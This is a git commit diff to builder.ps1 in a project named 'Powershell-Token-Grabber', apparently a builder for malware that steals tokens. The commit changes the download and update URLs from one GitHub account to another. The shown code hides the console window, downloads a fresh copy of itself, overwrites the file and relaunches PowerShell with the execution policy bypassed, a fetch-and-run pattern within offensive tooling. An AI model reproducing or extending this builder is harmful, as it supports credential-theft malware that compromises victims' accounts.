4d0f6dd7a5b2c7c6416dc03b796243dd0833dcc8
K.Dot <110929758+KDot227@users.noreply.github.com>
2023-07-30 03:30:50 -0500

    Update builder.ps1

--- builder.ps1
+++ builder.ps1
@@ -7,7 +7,7 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
-$download_url = "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main."
+$download_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main."
 
 $wpf_code = @'
 <Window x:Class="GUI_TEST.MainWindow"
@@ -207,7 +207,7 @@ function Invoke-EXE {
 }
 
 function Invoke-AutoUpdate {
-    $update_url = "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/builder.ps1"
+    $update_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/builder.ps1"
     $update = (New-Object System.Net.WebClient).DownloadString($update_url)
     $update | Out-File -FilePath "$PSScriptRoot\builder.ps1" -Force -Encoding ascii -NoNewline
     Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSScriptRoot\builder.ps1"
@@ -216,7 +216,7 @@ function Invoke-AutoUpdate {
 }
 
 function Invoke-CheckUpdate {
-    $update_url = "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/builder.ps1"
+    $update_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/builder.ps1"
     $update = (New-Object System.Net.WebClient).DownloadString($update_url)
     $current_code = Get-Content -Path "$PSScriptRoot\builder.ps1" -Raw
     if ($update -ne $current_code) {
